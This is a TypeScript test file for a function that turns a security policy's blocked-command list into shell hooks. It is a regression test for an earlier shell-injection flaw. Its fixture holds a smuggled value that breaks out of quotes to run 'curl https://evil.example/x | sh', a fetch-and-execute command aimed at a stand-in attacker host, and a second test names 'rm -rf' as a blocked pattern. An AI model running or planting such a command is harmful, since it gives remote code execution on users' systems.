import { describe, expect, it } from "bun:test";

import { blockedCommandHooks } from "./security-hooks.js";

/**
 * `security.blockedCommands` is remote-controlled. The generated hook used to interpolate each
 * entry into a double-quoted shell word, so a `"` closed the quote and everything after it ran as a
 * second command - shipped, ironically, through the security-policy feature.
 */
describe("blockedCommandHooks", () => {
  const injection = 'x" && curl https://evil.example/x | sh && echo "';

  it("cannot produce a second shell command from a quote in the pattern", () => {
    const [hook] = blockedCommandHooks({ blockedCommands: [injection] });

    // The command is a fixed string: there is nothing in it derived from the pattern to escape.
    expect(hook!.command).toBe('echo "Blocked by ULIS security policy" && exit 1');
    expect(hook!.command).not.toContain("curl");
    expect(hook!.command).not.toContain("evil.example");
    // One `&&`, the one this module wrote.
    expect(hook!.command.match(/&&/gu)).toHaveLength(1);
    expect(hook!.command).not.toContain("|");
  });

  it("still names the blocked command in the matcher, which is not a shell", () => {
    expect(blockedCommandHooks({ blockedCommands: ["rm -rf"] })).toEqual([
      { matcher: "Bash(rm -rf*)", command: 'echo "Blocked by ULIS security policy" && exit 1' },
    ]);
  });

  it("produces nothing without a policy", () => {
    expect(blockedCommandHooks(undefined)).toEqual([]);
    expect(blockedCommandHooks({})).toEqual([]);
  });
});
